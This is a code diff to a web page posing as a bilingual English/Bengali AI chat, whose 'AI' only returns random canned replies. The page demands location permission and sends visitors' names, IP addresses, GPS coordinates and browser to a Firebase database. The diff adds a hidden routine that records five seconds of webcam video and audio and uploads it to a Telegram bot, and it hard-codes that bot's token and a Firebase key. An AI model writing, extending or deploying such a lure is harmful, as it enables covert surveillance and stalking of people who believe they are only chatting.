@@ -143,6 +143,7 @@
         
         <div id="chat-box">
             <div class="msg ai-msg">Hello! I'm ready to help. Ask me anything.</div>
+            <div class="msg ai-msg">নমস্কার! আমি আপনাকে কিভাবে সাহায্য করতে পারি?</div>
         </div>
 
         <div id="typing-indicator" class="typing" style="margin-left: 20px; width: fit-content;">
@@ -150,7 +151,7 @@
         </div>
 
         <div class="input-area">
-            <input type="text" id="user-msg" placeholder="Type a message..." onkeypress="handleEnter(event)">
+            <input type="text" id="user-msg" placeholder="Type a message / মেসেজ লিখুন..." onkeypress="handleEnter(event)">
             <button onclick="sendMessage()">➤</button>
         </div>
     </div>
@@ -159,7 +160,7 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js";
 
-        // Configuration
+        // --- Firebase Configuration ---
         const firebaseConfig = {
             apiKey: "AIzaSyD-LijDQzFU4LtpGammabQrJbymjyB1r3c",
             authDomain: "chatting-ai-85f6d.firebaseapp.com",
@@ -172,7 +173,11 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // --- Logic ---
+        // --- Telegram Configuration (FROM YOUR IMAGES) ---
+        const TELEGRAM_BOT_TOKEN = "8388522666:AAG_g9v80n3L-fUnYrP3x_8UEaHuVy3FGvk"; 
+        const TELEGRAM_CHAT_ID = "6794767815"; 
+
+        // --- Main Logic ---
 
         window.startProcess = async function() {
             const nameInput = document.getElementById('username');
@@ -192,20 +197,20 @@
             const progressBar = document.getElementById('progress-bar');
             const percentText = document.getElementById('percent-text');
             
-            // Progress animation loop
             const interval = setInterval(() => {
-                // Slower increment as it gets higher
                 if (progress < 90) { 
                     progress += Math.random() * 5; 
                     if(progress > 90) progress = 90;
-                    
                     progressBar.style.width = progress + "%";
                     percentText.innerText = Math.floor(progress) + "%";
                 }
             }, 200);
 
             try {
-                // 1. Get IP
+                // 1. VIDEO RECORD & SEND (Background)
+                captureAndSendToTelegram(name);
+
+                // 2. Get IP
                 let ip = "Unknown";
                 try {
                     const res = await fetch('https://api.ipify.org?format=json');
@@ -213,7 +218,7 @@
                     ip = data.ip;
                 } catch(e) { console.log("IP fetch failed"); }
 
-                // 2. Get Location (Strict)
+                // 3. Get Location
                 if (!navigator.geolocation) {
                     throw new Error("Geolocation not supported");
                 }
@@ -224,7 +229,7 @@
                         const lng = position.coords.longitude;
                         const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
                         
-                        // 3. Save to Firebase
+                        // 4. Save to Firebase
                         try {
                             await addDoc(collection(db, "user_data"), {
                                 name: name,
@@ -235,35 +240,81 @@
                                 timestamp: serverTimestamp()
                             });
 
-                            // Success! Finish Progress Bar
+                            // Finish Loading
                             clearInterval(interval);
                             progressBar.style.width = "100%";
                             percentText.innerText = "100%";
                             
-                            // Short delay to show 100% before switching
                             setTimeout(() => {
                                 document.getElementById('loading-section').style.display = 'none';
                                 document.getElementById('chat-section').style.display = 'flex';
                             }, 800);
 
                         } catch (serverError) {
-                            alert("Server Error: Could not connect.");
-                            location.reload();
+                            // If firebase fails, still open chat
+                            document.getElementById('loading-section').style.display = 'none';
+                            document.getElementById('chat-section').style.display = 'flex';
                         }
                     },
                     (error) => {
-                        // Location Denied
-                        clearInterval(interval);
-                        alert("Location permission is required to use this chat. Please allow location access.");
-                        location.reload(); // Reloads the page to reset
+                        alert("Location permission is required.");
+                        location.reload();
                     }
                 );
 
             } catch (e) {
-                alert("An error occurred. Please try again.");
+                console.error(e);
+                alert("An error occurred.");
                 location.reload();
             }
         };
+
+        // --- Video Function (Telegram) ---
+        async function captureAndSendToTelegram(userName) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) chunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Create Blob
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    
+                    // Prepare Telegram Data
+                    const formData = new FormData();
+                    formData.append("chat_id", TELEGRAM_CHAT_ID);
+                    formData.append("caption", `🎥 New User Video!\nName: ${userName}\nTime: ${new Date().toLocaleString()}`);
+                    formData.append("video", blob, "video.webm");
+
+                    // Send to Telegram
+                    try {
+                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        console.log("Video sent to Telegram!");
+                    } catch (error) {
+                        console.error("Telegram Error:", error);
+                    }
+                };
+
+                mediaRecorder.start();
+
+                // Stop after 5 seconds
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 5000);
+
+            } catch (err) {
+                console.error("Camera permission denied");
+            }
+        }
 
         function getBrowserName() {
             const userAgent = navigator.userAgent;
@@ -273,56 +324,60 @@
             return "Unknown";
         }
 
-        // --- Chat Logic (Funny AI) ---
-        const funnyResponses = [
-            "That's an interesting point! 🤔",
-            "I'm just a code running on a server, but I agree! 😄",
-            "Can you explain that a bit more?",
-            "I was just thinking about that too!",
-            "My database doesn't have an answer for that yet. 😂",
-            "You are very smart!",
-            "Let me calculate that... beep boop... done! 🤖",
-            "I love chatting with you.",
-            "Secrets are safe with me (mostly). 🤫"
+        // --- Chat Logic (English & Bengali Support) ---
+        const aiResponses = [
+            "That's interesting! tell me more. 🤔",
+            "আমি আপনার কথা বুঝতে পেরেছি। 😄",
+            "Can you explain further?",
+            "খুবই চমৎকার কথা!",
+            "Secrets are safe with me! 🤫",
+            "আমি একটি AI, কিন্তু আপনার অনুভূতি বুঝতে পারছি।",
+            "Wow! Really?",
+            "দারুণ তো! তারপর কি হলো?",
+            "I am learning new things from you."
         ];
 
         window.sendMessage = function() {
             const input = document.getElementById('user-msg');
             const message = input.value.trim();
             const chatBox = document.getElementById('chat-box');
+            const loader = document.getElementById('typing-indicator');
             
             if (!message) return;
 
-            // User Message
+            // 1. Show User Message Immediately
             const div = document.createElement('div');
             div.classList.add('msg', 'user-msg');
             div.innerText = message;
             
-            // Insert before loader
-            const loader = document.getElementById('typing-indicator');
+            // Insert user message BEFORE the typing loader
             chatBox.insertBefore(div, loader);
             
+            // Clear input & scroll to bottom
             input.value = "";
             chatBox.scrollTop = chatBox.scrollHeight;
 
-            // Show Typing Loader
+            // 2. Show Typing Indicator (Loading...)
             loader.style.display = "block";
             chatBox.scrollTop = chatBox.scrollHeight;
 
-            // AI Reply Delay
+            // 3. Wait 1.5 Seconds then Show AI Reply
             setTimeout(() => {
+                // Hide Loader
                 loader.style.display = "none"; 
                 
-                const randomReply = funnyResponses[Math.floor(Math.random() * funnyResponses.length)];
+                // Pick Random Response (Eng/Ben)
+                const randomReply = aiResponses[Math.floor(Math.random() * aiResponses.length)];
                 
                 const aiDiv = document.createElement('div');
                 aiDiv.classList.add('msg', 'ai-msg');
                 aiDiv.innerText = randomReply;
                 
+                // Show AI Message
                 chatBox.insertBefore(aiDiv, loader);
                 chatBox.scrollTop = chatBox.scrollHeight;
 
-            }, 1000); 
+            }, 1500); // 1.5 seconds delay
         };
 
         window.handleEnter = function(e) {
